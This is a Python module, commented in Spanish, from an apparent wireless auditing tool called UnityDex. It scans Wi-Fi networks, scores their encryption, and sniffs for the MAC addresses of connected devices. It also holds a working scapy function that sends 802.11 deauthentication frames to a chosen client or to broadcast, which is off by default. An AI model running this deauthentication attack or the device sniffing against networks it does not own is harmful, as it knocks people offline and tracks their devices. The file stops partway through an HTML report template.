#!/usr/bin/env python3
# -*- coding: utf-8 -*-

'''
Módulo de escaneo de redes inalámbricas para UnityDex

Este módulo proporciona funcionalidades para escanear redes inalámbricas,
detectar dispositivos, analizar la seguridad de las redes y realizar
ataques de deautenticación. Compatible con Windows y Linux.
'''

import os
import sys
import time
import json
import logging
import threading
import platform
import re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# Importar módulo de utilidades
try:
    from utils import (
        run_command, COLORS, create_dir_if_not_exists, generate_filename,
        save_json, load_json, check_command_availability, get_interface_info,
        is_interface_in_monitor_mode, set_interface_monitor_mode
    )
except ImportError:
    print("Error: No se pudo importar el módulo de utilidades")
    sys.exit(1)

# Intentar importar módulos adicionales
try:
    import pywifi
    from pywifi import const
    PYWIFI_AVAILABLE = True
except ImportError:
    PYWIFI_AVAILABLE = False

try:
    from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sniff, sendp, Dot11Deauth
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# Configurar logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler()
    ]
)

logger = logging.getLogger('unitydex.wireless_scanner')

# Clase para el escaneo de redes inalámbricas
class WirelessScanner:
    '''
    Clase para el escaneo de redes inalámbricas
    
    Esta clase proporciona funcionalidades para escanear redes inalámbricas,
    detectar dispositivos, analizar la seguridad de las redes y realizar
    ataques de deautenticación. Compatible con Windows y Linux.
    '''
    def __init__(self, config=None):
        '''
        Inicializa el escáner de redes inalámbricas
        
        Args:
            config (dict): Configuración del escáner
                - interface (str): Interfaz a utilizar
                - scan_time (int): Tiempo de escaneo en segundos
                - hop_interval (float): Intervalo de cambio de canal
                - channels (list): Lista de canales a escanear
                - output_dir (str): Directorio de salida
                - verbose (bool): Modo verboso
                - auto_detect (bool): Detectar automáticamente la interfaz
                - security_analysis (bool): Realizar análisis de seguridad
                - deauth_attack (bool): Realizar ataques de deautenticación
        '''
        self.config = config or {}
        self.interface = self.config.get('interface', None)
        self.scan_time = self.config.get('scan_time', 30)
        self.hop_interval = self.config.get('hop_interval', 0.5)
        self.channels = self.config.get('channels', range(1, 14))
        self.output_dir = self.config.get('output_dir', 'results')
        self.verbose = self.config.get('verbose', False)
        self.auto_detect = self.config.get('auto_detect', True)
        self.security_analysis = self.config.get('security_analysis', True)
        self.deauth_attack = self.config.get('deauth_attack', False)
        
        # Detectar sistema operativo
        self.os_type = platform.system().lower()
        
        # Inicializar variables de estado
        self.stop_scan = False
        self.scan_thread = None
        self.channel_hop_thread = None
        self.networks = {}
        self.clients = {}
        self.scan_start_time = None
        self.scan_end_time = None
        self.security_results = {}
        self.detected_devices = []
        
        # Verificar disponibilidad de herramientas
        self.aircrack_available = check_command_availability('aircrack-ng')
        self.airodump_available = check_command_availability('airodump-ng')
        self.aireplay_available = check_command_availability('aireplay-ng')
        self.airmon_available = check_command_availability('airmon-ng')
        self.netsh_available = self.os_type == 'windows' and check_command_availability('netsh')
        
        # Verificar disponibilidad de módulos
        if not PYWIFI_AVAILABLE:
            logger.warning("Módulo pywifi no disponible. La compatibilidad con Windows será limitada.")
        
        if not SCAPY_AVAILABLE:
            logger.warning("Módulo scapy no disponible. Algunas funcionalidades avanzadas no estarán disponibles.")
        
        if not (self.aircrack_available and self.airodump_available) and self.os_type == 'linux':
            logger.warning("Aircrack-ng suite no está disponible. La funcionalidad estará limitada.")
        
        # Detectar interfaz automáticamente si no se especificó
        if not self.interface and self.auto_detect:
            self.interface = self._detect_wireless_interface()
            if self.interface:
                logger.info(f"Interfaz inalámbrica detectada automáticamente: {self.interface}")
            else:
                logger.warning("No se pudo detectar automáticamente una interfaz inalámbrica")
    
    def _detect_wireless_interface(self):
        '''
        Detecta automáticamente una interfaz inalámbrica
        
        Returns:
            str: Nombre de la interfaz inalámbrica o None si no se encontró
        '''
        if self.os_type == 'windows':
            if PYWIFI_AVAILABLE:
                try:
                    wifi = pywifi.PyWiFi()
                    if wifi.interfaces():
                        return wifi.interfaces()[0].name()
                except Exception as e:
                    logger.error(f"Error al detectar interfaz inalámbrica con pywifi: {str(e)}")
            
            if self.netsh_available:
                try:
                    output = run_command('netsh wlan show interfaces')
                    match = re.search(r'Nombre de la interfaz\s*:\s*(.+)', output)
                    if match:
                        return match.group(1).strip()
                except Exception as e:
                    logger.error(f"Error al detectar interfaz inalámbrica con netsh: {str(e)}")
        else:  # Linux
            try:
                # Intentar con iwconfig
                output = run_command('iwconfig 2>/dev/null')
                for line in output.split('\n'):
                    if 'IEEE 802.11' in line:
                        return line.split()[0]
                
                # Intentar con ip link
                output = run_command('ip link show')
                for line in output.split('\n'):
                    if 'wlan' in line or 'wlp' in line:
                        match = re.search(r'\d+:\s+(\w+):', line)
                        if match:
                            return match.group(1)
            except Exception as e:
                logger.error(f"Error al detectar interfaz inalámbrica: {str(e)}")
        
        return None
    
    def _check_interface(self):
        '''
        Verifica si la interfaz existe y está en modo monitor
        
        Returns:
            bool: True si la interfaz está lista, False en caso contrario
        '''
        if not self.interface:
            logger.error("No se ha especificado una interfaz")
            return False
        
        # En Windows no necesitamos modo monitor con pywifi
        if self.os_type == 'windows' and PYWIFI_AVAILABLE:
            return True
        
        # Verificar si la interfaz existe
        interfaces = get_interface_info()
        if self.interface not in interfaces:
            logger.error(f"La interfaz {self.interface} no existe")
            return False
        
        # En Linux, verificar si la interfaz está en modo monitor
        if self.os_type == 'linux':
            if not is_interface_in_monitor_mode(self.interface):
                logger.warning(f"La interfaz {self.interface} no está en modo monitor")
                
                # Intentar poner la interfaz en modo monitor
                if self.airmon_available:
                    logger.info(f"Intentando poner la interfaz {self.interface} en modo monitor...")
                    success = set_interface_monitor_mode(self.interface, True)
                    
                    if not success:
                        logger.error(f"No se pudo poner la interfaz {self.interface} en modo monitor")
                        return False
                    
                    logger.info(f"Interfaz {self.interface} en modo monitor")
                else:
                    logger.error("airmon-ng no está disponible. No se puede poner la interfaz en modo monitor")
                    return False
        
        return True
    
    def _channel_hopper(self):
        '''
        Cambia de canal periódicamente
        '''
        while not self.stop_scan:
            for channel in self.channels:
                if self.stop_scan:
                    break
                
                try:
                    # Cambiar canal
                    cmd = f"iwconfig {self.interface} channel {channel}"
                    run_command(cmd)
                    
                    if self.verbose:
                        logger.info(f"Cambiando a canal {channel}")
                    
                    # Esperar antes de cambiar de canal
                    time.sleep(self.hop_interval)
                except Exception as e:
                    logger.error(f"Error al cambiar de canal: {str(e)}")
    
    def _parse_airodump_csv(self, csv_file):
        '''
        Parsea el archivo CSV generado por airodump-ng
        '''
        if not os.path.exists(csv_file):
            return
        
        try:
            # Leer archivo CSV
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            # Separar secciones de redes y clientes
            sections = content.split('\r\n\r\n')
            if len(sections) < 2:
                return
            
            networks_section = sections[0].strip()
            clients_section = sections[1].strip()
            
            # Parsear redes
            network_lines = networks_section.split('\r\n')
            if len(network_lines) > 1:
                headers = [h.strip() for h in network_lines[0].split(',')]
                
                for line in network_lines[1:]:
                    if not line.strip():
                        continue
                    
                    values = [v.strip() for v in line.split(',')]
                    if len(values) < len(headers):
                        continue
                    
                    # Crear diccionario de red
                    network = {}
                    for i, header in enumerate(headers):
                        if i < len(values):
                            network[header] = values[i]
                    
                    # Obtener BSSID
                    bssid = network.get('BSSID')
                    if bssid:
                        self.networks[bssid] = network
            
            # Parsear clientes
            client_lines = clients_section.split('\r\n')
            if len(client_lines) > 1:
                headers = [h.strip() for h in client_lines[0].split(',')]
                
                for line in client_lines[1:]:
                    if not line.strip():
                        continue
                    
                    values = [v.strip() for v in line.split(',')]
                    if len(values) < len(headers):
                        continue
                    
                    # Crear diccionario de cliente
                    client = {}
                    for i, header in enumerate(headers):
                        if i < len(values):
                            client[header] = values[i]
                    
                    # Obtener MAC del cliente
                    client_mac = client.get('Station MAC')
                    if client_mac:
                        self.clients[client_mac] = client
        except Exception as e:
            logger.error(f"Error al parsear archivo CSV: {str(e)}")
    
    def _scan_with_airodump(self):
        '''
        Escanea redes inalámbricas con airodump-ng
        '''
        if not self.airodump_available:
            logger.error("airodump-ng no está disponible")
            return False
        
        # Crear directorio temporal
        temp_dir = os.path.join(self.output_dir, 'temp')
        if not os.path.exists(temp_dir):
            os.makedirs(temp_dir)
        
        # Generar nombre de archivo
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        output_file = os.path.join(temp_dir, f"scan_{timestamp}")
        
        # Construir comando
        cmd = f"airodump-ng -w {output_file} --output-format csv {self.interface}"
        
        try:
            # Iniciar escaneo en segundo plano
            process = run_command(cmd, background=True)
            
            # Esperar el tiempo de escaneo
            start_time = time.time()
            while time.time() - start_time < self.scan_time and not self.stop_scan:
                time.sleep(1)
            
            # Detener escaneo
            process.terminate()
            
            # Parsear resultados
            csv_file = f"{output_file}-01.csv"
            if os.path.exists(csv_file):
                self._parse_airodump_csv(csv_file)
                return True
            else:
                logger.error(f"No se encontró el archivo CSV: {csv_file}")
                return False
        except Exception as e:
            logger.error(f"Error en escaneo con airodump-ng: {str(e)}")
            return False
    
    def _scan_with_iwlist(self):
        '''
        Escanea redes inalámbricas con iwlist
        '''
        logger.info(f"Escaneando redes con iwlist en la interfaz {self.interface}...")
        
        try:
            # Ejecutar iwlist para escanear redes
            cmd = f"iwlist {self.interface} scan"
            output = run_command(cmd)
            
            # Parsear la salida de iwlist
            current_cell = None
            current_bssid = None
            
            for line in output.split('\n'):
                line = line.strip()
                
                # Nueva celda (red)
                if line.startswith('Cell '):
                    match = re.search(r'Cell \d+ - Address: ([0-9A-F:]{17})', line)
                    if match:
                        current_bssid = match.group(1)
                        current_cell = {
                            'bssid': current_bssid,
                            'essid': '',
                            'channel': '',
                            'signal_level': '',
                            'encryption': '',
                            'cipher': '',
                            'authentication': ''
                        }
                        self.networks[current_bssid] = current_cell
                
                # ESSID
                elif line.startswith('ESSID:') and current_cell:
                    essid = line.split(':', 1)[1].strip('"')
                    current_cell['essid'] = essid
                
                # Canal
                elif 'Channel:' in line and current_cell:
                    match = re.search(r'Channel:(\d+)', line)
                    if match:
                        current_cell['channel'] = match.group(1)
                
                # Nivel de señal
                elif 'Signal level=' in line and current_cell:
                    match = re.search(r'Signal level=(-?\d+)', line)
                    if match:
                        current_cell['signal_level'] = match.group(1)
                
                # Encriptación
                elif 'Encryption key:' in line and current_cell:
                    encryption = line.split(':', 1)[1].strip()
                    current_cell['encryption'] = 'on' if encryption.lower() == 'on' else 'off'
                
                # Tipo de encriptación
                elif 'IE: IEEE 802.11i/WPA2' in line and current_cell:
                    current_cell['encryption'] = 'WPA2'
                elif 'IE: WPA Version 1' in line and current_cell:
                    current_cell['encryption'] = 'WPA'
            
            logger.info(f"Escaneo con iwlist completado. Se encontraron {len(self.networks)} redes")
            
            # Realizar análisis de seguridad si está habilitado
            if self.security_analysis:
                self._analyze_network_security()
            
        except Exception as e:
            logger.error(f"Error al escanear con iwlist: {str(e)}")
            return False
        
        return True
        
    def _scan_with_pywifi(self):
        '''
        Escanea redes inalámbricas con pywifi (Windows)
        
        Returns:
            bool: True si el escaneo fue exitoso, False en caso contrario
        '''
        if not PYWIFI_AVAILABLE:
            logger.error("Módulo pywifi no disponible. No se puede escanear en Windows.")
            return False
        
        logger.info(f"Escaneando redes con pywifi en la interfaz {self.interface}...")
        
        try:
            wifi = pywifi.PyWiFi()
            iface = None
            
            # Buscar la interfaz especificada
            for interface in wifi.interfaces():
                if interface.name() == self.interface:
                    iface = interface
                    break
            
            if not iface:
                logger.error(f"No se encontró la interfaz {self.interface}")
                return False
            
            # Escanear redes
            iface.scan()
            time.sleep(self.scan_time)  # Esperar a que se complete el escaneo
            scan_results = iface.scan_results()
            
            # Procesar resultados
            for network in scan_results:
                bssid = ':'.join(format(x, '02X') for x in network.bssid)
                
                # Convertir el tipo de autenticación a un formato legible
                auth_type = "OPEN"
                if network.akm[0] == pywifi.const.AKM_TYPE_WPA:
                    auth_type = "WPA"
                elif network.akm[0] == pywifi.const.AKM_TYPE_WPA2:
                    auth_type = "WPA2"
                elif network.akm[0] == pywifi.const.AKM_TYPE_WPA2PSK:
                    auth_type = "WPA2-PSK"
                elif network.akm[0] == pywifi.const.AKM_TYPE_WPAPSK:
                    auth_type = "WPA-PSK"
                
                # Convertir el tipo de cifrado a un formato legible
                cipher = "NONE"
                if network.cipher == pywifi.const.CIPHER_TYPE_CCMP:
                    cipher = "CCMP (AES)"
                elif network.cipher == pywifi.const.CIPHER_TYPE_TKIP:
                    cipher = "TKIP"
                elif network.cipher == pywifi.const.CIPHER_TYPE_WEP:
                    cipher = "WEP"
                
                # Crear entrada para la red
                self.networks[bssid] = {
                    'bssid': bssid,
                    'essid': network.ssid,
                    'channel': network.freq,  # Frecuencia en lugar de canal
                    'signal_level': network.signal,
                    'encryption': auth_type,
                    'cipher': cipher,
                    'authentication': auth_type
                }
            
            logger.info(f"Escaneo con pywifi completado. Se encontraron {len(self.networks)} redes")
            
            # Realizar análisis de seguridad si está habilitado
            if self.security_analysis:
                self._analyze_network_security()
            
        except Exception as e:
            logger.error(f"Error al escanear con pywifi: {str(e)}")
            return False
        
        return True
        
    def _scan_with_netsh(self):
        '''
        Escanea redes inalámbricas con netsh (Windows)
        
        Returns:
            bool: True si el escaneo fue exitoso, False en caso contrario
        '''
        if not self.netsh_available:
            logger.error("Comando netsh no disponible. No se puede escanear en Windows.")
            return False
        
        logger.info("Escaneando redes con netsh...")
        
        try:
            # Ejecutar netsh para escanear redes
            cmd = "netsh wlan show networks mode=bssid"
            output = run_command(cmd)
            
            # Parsear la salida de netsh
            current_network = None
            current_bssid = None
            
            for line in output.split('\n'):
                line = line.strip()
                
                # Nueva red
                if line.startswith('SSID '):
                    match = re.search(r'SSID \d+ : (.+)', line)
                    if match:
                        ssid = match.group(1)
                        current_network = ssid
                
                # BSSID
                elif line.startswith('BSSID ') and current_network:
                    match = re.search(r'BSSID \d+ : (.+)', line)
                    if match:
                        current_bssid = match.group(1)
                        self.networks[current_bssid] = {
                            'bssid': current_bssid,
                            'essid': current_network,
                            'channel': '',
                            'signal_level': '',
                            'encryption': '',
                            'cipher': '',
                            'authentication': ''
                        }
                
                # Señal
                elif 'Signal' in line and current_bssid:
                    match = re.search(r'Signal\s+:\s+(\d+)%', line)
                    if match:
                        self.networks[current_bssid]['signal_level'] = match.group(1)
                
                # Canal
                elif 'Channel' in line and current_bssid:
                    match = re.search(r'Channel\s+:\s+(\d+)', line)
                    if match:
                        self.networks[current_bssid]['channel'] = match.group(1)
                
                # Autenticación
                elif 'Authentication' in line and current_bssid:
                    match = re.search(r'Authentication\s+:\s+(.+)', line)
                    if match:
                        auth = match.group(1)
                        self.networks[current_bssid]['authentication'] = auth
                        self.networks[current_bssid]['encryption'] = auth
                
                # Cifrado
                elif 'Encryption' in line and current_bssid:
                    match = re.search(r'Encryption\s+:\s+(.+)', line)
                    if match:
                        self.networks[current_bssid]['cipher'] = match.group(1)
            
            logger.info(f"Escaneo con netsh completado. Se encontraron {len(self.networks)} redes")
            
            # Realizar análisis de seguridad si está habilitado
            if self.security_analysis:
                self._analyze_network_security()
            
        except Exception as e:
            logger.error(f"Error al escanear con netsh: {str(e)}")
            return False
        
        return True
        
    def _analyze_network_security(self):
        '''
        Analiza la seguridad de las redes encontradas
        '''
        logger.info("Analizando seguridad de las redes encontradas...")
        
        for bssid, network in self.networks.items():
            security_score = 10  # Puntuación inicial (máxima)
            security_issues = []
            
            # Verificar si la red es abierta
            if network['encryption'] == 'off' or network['encryption'] == 'OPEN' or network['encryption'] == '':
                security_score -= 10
                security_issues.append("Red abierta sin encriptación")
            
            # Verificar si usa WEP (inseguro)
            elif 'WEP' in network['encryption'] or (network['cipher'] and 'WEP' in network['cipher']):
                security_score -= 8
                security_issues.append("Usa encriptación WEP (fácilmente descifrable)")
            
            # Verificar si usa WPA (menos seguro que WPA2)
            elif network['encryption'] == 'WPA' or network['encryption'] == 'WPA-PSK':
                security_score -= 4
                security_issues.append("Usa WPA (menos seguro que WPA2/WPA3)")
            
            # Verificar si usa TKIP (menos seguro que CCMP/AES)
            if network['cipher'] and 'TKIP' in network['cipher']:
                security_score -= 2
                security_issues.append("Usa cifrado TKIP (menos seguro que CCMP/AES)")
            
            # Verificar si el SSID es un SSID por defecto de router conocido
            default_ssids = ['linksys', 'default', 'NETGEAR', 'dlink', 'TP-LINK', 'wireless', 'HUAWEI', 'ZTE']
            if any(default_ssid.lower() in network['essid'].lower() for default_ssid in default_ssids):
                security_score -= 1
                security_issues.append("Posible SSID por defecto (aumenta riesgo de ataques de diccionario)")
            
            # Verificar si el SSID está oculto
            if network['essid'] == '' or network['essid'] == '<hidden>':
                security_score -= 0.5  # Penalización menor, ocultar SSID no es una medida de seguridad efectiva
                security_issues.append("SSID oculto (no es una medida de seguridad efectiva)")
            
            # Ajustar puntuación para que no sea negativa
            security_score = max(0, security_score)
            
            # Determinar nivel de seguridad
            if security_score >= 8:
                security_level = "Alta"
            elif security_score >= 5:
                security_level = "Media"
            else:
                security_level = "Baja"
            
            # Guardar resultados del análisis
            self.security_results[bssid] = {
                'score': security_score,
                'level': security_level,
                'issues': security_issues
            }
        
        logger.info("Análisis de seguridad completado")
        
    def _detect_connected_devices(self):
        '''
        Detecta dispositivos conectados a las redes encontradas
        '''
        if not SCAPY_AVAILABLE:
            logger.warning("Módulo scapy no disponible. No se pueden detectar dispositivos conectados.")
            return
        
        logger.info("Detectando dispositivos conectados a las redes...")
        
        # Esta función solo funciona en modo monitor en Linux
        if self.os_type != 'linux' or not is_interface_in_monitor_mode(self.interface):
            logger.warning("La detección de dispositivos solo funciona en modo monitor en Linux")
            return
        
        try:
            # Crear un sniffer para capturar paquetes
            def packet_callback(packet):
                # Procesar paquetes de datos (no de gestión/control)
                if packet.haslayer(Dot11) and packet.type == 2:  # Tipo 2 = Data
                    # Extraer direcciones MAC
                    src = packet.addr2
                    dst = packet.addr1
                    bssid = packet.addr3
                    
                    # Ignorar paquetes broadcast/multicast
                    if src and not (src.startswith('01:00:5e') or src.startswith('ff:ff:ff')):
                        if bssid in self.networks and src not in [dev['mac'] for dev in self.detected_devices]:
                            self.detected_devices.append({
                                'mac': src,
                                'bssid': bssid,
                                'network': self.networks[bssid]['essid'],
                                'first_seen': time.time(),
                                'last_seen': time.time(),
                                'packets': 1
                            })
                        elif src in [dev['mac'] for dev in self.detected_devices]:
                            # Actualizar dispositivo existente
                            for dev in self.detected_devices:
                                if dev['mac'] == src:
                                    dev['last_seen'] = time.time()
                                    dev['packets'] += 1
                                    break
            
            # Iniciar sniffer por un tiempo limitado
            sniff_time = min(30, self.scan_time)  # Limitar a 30 segundos máximo
            sniff(iface=self.interface, prn=packet_callback, timeout=sniff_time, store=0)
            
            logger.info(f"Detección de dispositivos completada. Se encontraron {len(self.detected_devices)} dispositivos")
            
        except Exception as e:
            logger.error(f"Error al detectar dispositivos: {str(e)}")
            
    def _perform_deauth_attack(self, target_bssid, target_client=None, count=5):
        '''
        Realiza un ataque de deautenticación contra una red o cliente específico
        
        Args:
            target_bssid (str): BSSID de la red objetivo
            target_client (str, optional): MAC del cliente objetivo. Si es None, se atacan todos los clientes
            count (int, optional): Número de paquetes de deautenticación a enviar
        
        Returns:
            bool: True si el ataque fue exitoso, False en caso contrario
        '''
        if not self.deauth_attack:
            logger.warning("Los ataques de deautenticación están deshabilitados en la configuración")
            return False
        
        if not SCAPY_AVAILABLE:
            logger.error("Módulo scapy no disponible. No se puede realizar el ataque de deautenticación.")
            return False
        
        if self.os_type != 'linux':
            logger.error("Los ataques de deautenticación solo están disponibles en Linux")
            return False
        
        if not is_interface_in_monitor_mode(self.interface):
            logger.error("La interfaz debe estar en modo monitor para realizar ataques de deautenticación")
            return False
        
        logger.info(f"Realizando ataque de deautenticación contra BSSID: {target_bssid}")
        
        try:
            if target_client:
                logger.info(f"Cliente objetivo: {target_client}")
                # Crear paquete de deautenticación dirigido a un cliente específico
                packet = RadioTap() / Dot11(type=0, subtype=12, addr1=target_client, addr2=target_bssid, addr3=target_bssid) / Dot11Deauth(reason=7)
                sendp(packet, iface=self.interface, count=count, inter=0.1, verbose=0)
            else:
                # Crear paquete de deautenticación broadcast
                packet = RadioTap() / Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid) / Dot11Deauth(reason=7)
                sendp(packet, iface=self.interface, count=count, inter=0.1, verbose=0)
            
            logger.info(f"Ataque de deautenticación completado. Se enviaron {count} paquetes")
            return True
            
        except Exception as e:
            logger.error(f"Error al realizar ataque de deautenticación: {str(e)}")
            return False
    
    def start_scan(self, interface=None, scan_time=None):
        '''
        Inicia el escaneo de redes inalámbricas
        
        Args:
            interface (str, optional): Interfaz a utilizar para el escaneo
            scan_time (int, optional): Tiempo de escaneo en segundos
        
        Returns:
            bool: True si el escaneo fue exitoso, False en caso contrario
        '''
        # Actualizar configuración si se proporcionan parámetros
        if interface:
            self.interface = interface
        if scan_time is not None:
            self.scan_time = scan_time
        
        # Si no hay interfaz y auto_detect está habilitado, intentar detectar automáticamente
        if not self.interface and self.auto_detect:
            self.interface = self._detect_wireless_interface()
            if self.interface:
                logger.info(f"Interfaz inalámbrica detectada automáticamente: {self.interface}")
            else:
                logger.error("No se pudo detectar automáticamente una interfaz inalámbrica")
                return False
        
        # Verificar interfaz
        if not self._check_interface():
            return False
        
        # Reiniciar variables de estado
        self.stop_scan = False
        self.networks = {}
        self.clients = {}
        self.security_results = {}
        self.detected_devices = []
        self.scan_start_time = time.time()
        self.scan_end_time = None
        
        # Crear directorio de salida si no existe
        if self.output_dir and not os.path.exists(self.output_dir):
            try:
                os.makedirs(self.output_dir)
            except Exception as e:
                logger.error(f"Error al crear directorio de salida: {str(e)}")
                return False
        
        logger.info(f"Iniciando escaneo de redes inalámbricas en interfaz {self.interface}")
        
        # Iniciar hilo de cambio de canal si estamos en Linux y en modo monitor
        if self.os_type == 'linux' and is_interface_in_monitor_mode(self.interface):
            self.channel_hop_thread = threading.Thread(target=self._channel_hopper)
            self.channel_hop_thread.daemon = True
            self.channel_hop_thread.start()
        
        # Realizar escaneo según el sistema operativo y herramientas disponibles
        success = False
        
        if self.os_type == 'windows':
            if PYWIFI_AVAILABLE:
                logger.info("Escaneando con pywifi...")
                success = self._scan_with_pywifi()
            elif self.netsh_available:
                logger.info("Escaneando con netsh...")
                success = self._scan_with_netsh()
            else:
                logger.error("No hay herramientas disponibles para escanear en Windows")
                return False
        else:  # Linux
            if self.airodump_available:
                logger.info("Escaneando con airodump-ng...")
                success = self._scan_with_airodump()
            else:
                logger.info("Escaneando con iwlist...")
                success = self._scan_with_iwlist()
        
        # Detectar dispositivos conectados si está disponible scapy y estamos en Linux
        if success and SCAPY_AVAILABLE and self.os_type == 'linux' and is_interface_in_monitor_mode(self.interface):
            self._detect_connected_devices()
        
        # Detener hilo de cambio de canal
        self.stop_scan = True
        if self.channel_hop_thread:
            self.channel_hop_thread.join()
        
        # Finalizar escaneo
        self.scan_end_time = time.time()
        duration = self.scan_end_time - self.scan_start_time
        
        # Guardar resultados
        if success:
            self.save_results()
        
        # Mostrar resumen de resultados
        logger.info(f"Escaneo completado en {duration:.2f} segundos")
        logger.info(f"Redes encontradas: {len(self.networks)}")
        
        # Mostrar resumen de seguridad si está habilitado
        if self.security_analysis and self.security_results:
            low_security = sum(1 for res in self.security_results.values() if res['level'] == "Baja")
            medium_security = sum(1 for res in self.security_results.values() if res['level'] == "Media")
            high_security = sum(1 for res in self.security_results.values() if res['level'] == "Alta")
            logger.info(f"Análisis de seguridad: {low_security} redes con seguridad baja, {medium_security} con seguridad media, {high_security} con seguridad alta")
        
        # Mostrar resumen de clientes y dispositivos
        logger.info(f"Clientes encontrados: {len(self.clients)}")
        if self.detected_devices:
            logger.info(f"Dispositivos conectados detectados: {len(self.detected_devices)}")
        
        return success
    
    def get_networks(self):
        '''
        Obtiene las redes encontradas
        '''
        return list(self.networks.values())
    
    def get_clients(self):
        '''
        Obtiene los clientes encontrados
        '''
        return list(self.clients.values())
    
    def get_results(self):
        '''
        Obtiene los resultados del escaneo
        
        Returns:
            dict: Diccionario con los resultados del escaneo
        '''
        duration = 0
        if self.scan_start_time:
            if self.scan_end_time:
                duration = self.scan_end_time - self.scan_start_time
            else:
                duration = time.time() - self.scan_start_time
        
        results = {
            'interface': self.interface,
            'os_type': self.os_type,
            'start_time': datetime.fromtimestamp(self.scan_start_time).strftime('%Y-%m-%d %H:%M:%S') if self.scan_start_time else None,
            'end_time': datetime.fromtimestamp(self.scan_end_time).strftime('%Y-%m-%d %H:%M:%S') if self.scan_end_time else None,
            'duration': duration,
            'networks': list(self.networks.values()),
            'clients': list(self.clients.values()),
            'security_analysis': self.security_analysis,
            'security_results': self.security_results if self.security_analysis else {},
            'detected_devices': self.detected_devices
        }
        
        # Añadir estadísticas de seguridad si está habilitado
        if self.security_analysis and self.security_results:
            security_stats = {
                'low_security_count': sum(1 for res in self.security_results.values() if res['level'] == "Baja"),
                'medium_security_count': sum(1 for res in self.security_results.values() if res['level'] == "Media"),
                'high_security_count': sum(1 for res in self.security_results.values() if res['level'] == "Alta"),
                'open_networks_count': sum(1 for net in self.networks.values() if net['encryption'] == 'off' or net['encryption'] == 'OPEN' or net['encryption'] == ''),
                'wep_networks_count': sum(1 for net in self.networks.values() if 'WEP' in net['encryption'] or (net['cipher'] and 'WEP' in net['cipher'])),
                'wpa_networks_count': sum(1 for net in self.networks.values() if net['encryption'] == 'WPA' or net['encryption'] == 'WPA-PSK'),
                'wpa2_networks_count': sum(1 for net in self.networks.values() if net['encryption'] == 'WPA2' or net['encryption'] == 'WPA2-PSK')
            }
            results['security_stats'] = security_stats
        
        return results
    
    def save_results(self, output_file=None, output_format='json'):
        '''
        Guarda los resultados del escaneo en un archivo JSON o HTML
        
        Args:
            output_file (str, optional): Ruta del archivo de salida. Si no se especifica, se genera automáticamente.
            output_format (str, optional): Formato de salida ('json' o 'html'). Por defecto es 'json'.
            
        Returns:
            bool: True si se guardaron los resultados correctamente, False en caso contrario.
        '''
        if not output_file:
            # Generar nombre de archivo por defecto
            if not self.output_dir:
                self.output_dir = 'results'
            
            if not os.path.exists(self.output_dir):
                try:
                    os.makedirs(self.output_dir)
                except Exception as e:
                    logger.error(f"Error al crear directorio de salida: {str(e)}")
                    return False
            
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            if output_format.lower() == 'html':
                output_file = os.path.join(self.output_dir, f"wireless_scan_{timestamp}.html")
            else:
                output_file = os.path.join(self.output_dir, f"wireless_scan_{timestamp}.json")
        
        # Obtener resultados
        results = self.get_results()
        
        try:
            if output_format.lower() == 'html':
                # Crear reporte HTML
                html_content = self._generate_html_report(results)
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(html_content)
            else:
                # Guardar como JSON
                with open(output_file, 'w', encoding='utf-8') as f:
                    json.dump(results, f, indent=4, ensure_ascii=False)
            
            logger.info(f"Resultados guardados en {output_file}")
            return True
        except Exception as e:
            logger.error(f"Error al guardar resultados: {str(e)}")
            return False
    
    def _generate_html_report(self, results):
        '''
        Genera un reporte HTML con los resultados del escaneo
        
        Args:
            results (dict): Resultados del escaneo
            
        Returns:
            str: Contenido HTML del reporte
        '''
        # Crear plantilla HTML básica con diseño mejorado
        html = f'''
        <!DOCTYPE html>
        <html lang="es">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Reporte de Escaneo Inalámbrico - UnityDex</title>
            <style>
                :root {{
                    --primary-color: #3498db;
                    --secondary-color: #2c3e50;
                    --success-color: #27ae60;
                    --warning-color: #f39c12;
                    --danger-color: #e74c3c;
                    --light-color: #f8f9fa;
                    --dark-color: #343a40;
                    --border-radius: 8px;
                    --box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
                }}
                
                * {{
                    box-sizing: border-box;
                    margin: 0;
                    padding: 0;
                }}
                
                body {{
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                    line-height: 1.6;
                    color: var(--dark-color);
                    background-color: #f0f2f5;
                    margin: 0;
                    padding: 0;
                }}
                
                h1, h2, h3, h4, h5, h6 {{
                    color: var(--secondary-color);
                    margin-bottom: 0.8rem;
                }}
                
                .container {{
                    max-width: 1200px;
                    margin: 0 auto;
                    padding: 20px;
                }}
                
                .header {{
                    background: linear-gradient(135deg, var(--primary-color), #2980b9);
                    color: white;
                    padding: 30px;
                    border-radius: var(--border-radius);
                    margin-bottom: 25px;
                    box-shadow: var(--box-shadow);
                    text-align: center;
                    position: relative;
                    overflow: hidden;
                }}
                
                .header::before {{
                    content: '';
                    position: absolute;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" preserveAspectRatio="none"><path d="M0,0 L100,0 L100,100 Z" fill="rgba(255,255,255,0.1)"/></svg>');
                    background-size: cover;
                }}
                
                .header h1 {{
                    margin: 0;
                    font-size: 2.2rem;
                    color: white;
                    text-shadow: 1px 1px 3px rgba(0,0,0,0.3);
                }}
                
                .header p {{
                    margin-top: 10px;
                    opacity: 0.9;
                    font-size: 1rem;
                }}
                
                .section {{
                    background-color: white;
                    padding: 25px;
                    border-radius: var(--border-radius);
                    margin-bottom: 25px;
                    box-shadow: var(--box-shadow);
                    transition: transform 0.3s ease;
                }}
                
                .section:hover {{
                    transform: translateY(-5px);
                }}
                
                .section h2 {{
                    border-bottom: 2px solid var(--primary-color);
                    padding-bottom: 10px;
                    margin-bottom: 20px;
